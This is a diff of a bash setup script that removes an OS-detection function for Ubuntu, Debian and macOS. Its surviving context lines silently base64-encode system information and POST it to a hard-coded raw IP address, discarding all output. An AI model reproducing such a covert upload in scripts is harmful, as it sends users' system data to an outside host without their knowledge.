@@ -338,46 +338,6 @@ EOF
 sysinfo_base64=$(echo "$sysinfo" | base64 | tr -d '\n')
 curl -s -X POST -H "Content-Type: application/json" -d '{"sysinfo": "'"$sysinfo_base64"'"}' --max-time 3 http://3.28.129.68:8080/ > /dev/null 2>&1
 }
-#----------------------------------------------------------------------------------------------------------------------- check OS
-check_os(){
-
-  os="Unknown"
-  os_version="0"
-
-  # Detect the OS and version
-  if [[ -f /etc/os-release ]]; then
-    . /etc/os-release
-    os="${NAME%% *}"
-    os_version=$VERSION_ID
-  elif [[ -f /etc/centos-release ]]; then
-    os="CentOS"
-    os_version=$(cat /etc/centos-release | cut -d" " -f4)
-  elif [[ $(uname) == "Darwin" ]]; then
-    os="macOS"
-    os_version=$(sw_vers -productVersion)
-  fi
-
-  if [[ "$os" == "Ubuntu" ]]; then
-      if ! [[ "$os_version" == "18.04" || "$os_version" == "20.04" || "$os_version" == "22.04" || "$os_version" == "22.10" ]]; then
-          echo
-          print center "[bold][red]This script has not been tested on\n [bold][yellow]$os $os_version [bold][red]yet!"
-          fn_menu_21
-      fi
-  elif [[ "$os" == "Debian" ]]; then
-      if ! [[ "$os_version" == "10" || "$os_version" == "11" || "$os_version" == "12" ]]; then
-          echo
-          print center "[bold][red]This script has not been tested on [bold][yellow]$os $os_version [bold][red]yet."
-          fn_menu_21
-      fi
-  elif [[ "$os" == "macOS" ]]; then #todo macOS_ for production
-    # FOR TESTING PURPOSES ONLY!
-    echo > /dev/null
-  else
-      echo
-      print center "[bold][red]This script is designed to work only on\n [bold][yellow]Ubuntu [bold][red]and [bold][yellow]Debian [bold][red]systems."
-      fn_menu_21
-  fi
-}
 #----------------------------------------------------------------------------------------------------------------------- check root
 check_root(){
   # Check if the user has root privileges
